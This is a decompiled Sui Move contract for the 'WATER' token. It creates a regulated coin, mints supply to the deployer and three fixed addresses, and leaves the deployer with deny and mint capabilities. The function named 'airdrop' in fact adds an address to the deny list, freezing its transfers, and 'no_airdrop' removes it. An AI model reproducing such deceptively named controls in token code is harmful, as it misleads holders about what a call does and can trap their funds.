module 0xc79299026cf8d1fcb5619953d87c0c2251d4603392b2ae8f5105b2b8d48cc0c0::water {
    struct WATER has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WATER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WATER>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: WATER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WATER>(arg0, 9, b"WATER", b"Water on Sui", b"WATER MAKING WAVES ON SUI.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://api.movepump.com/uploads/logowave_769a9648f6.png")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WATER>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WATER>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<WATER>(&mut v3, 500000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::coin::mint_and_transfer<WATER>(&mut v3, 166666666666666660, @0xbb2a8bd8cbe3ef5e9e89ff6369d7d57afba32032ab99f9071d81984201b37b94, arg1);
        0x2::coin::mint_and_transfer<WATER>(&mut v3, 166666666666666660, @0x69e913240570e08d73a420a29906acc3013462ce79a9f7f94b6875777fbe9ac5, arg1);
        0x2::coin::mint_and_transfer<WATER>(&mut v3, 166666666666666660, @0x5cb636d3c68707cc93502208475759b267788a18dacbe6b810109bacb8988875, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<WATER>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WATER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WATER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

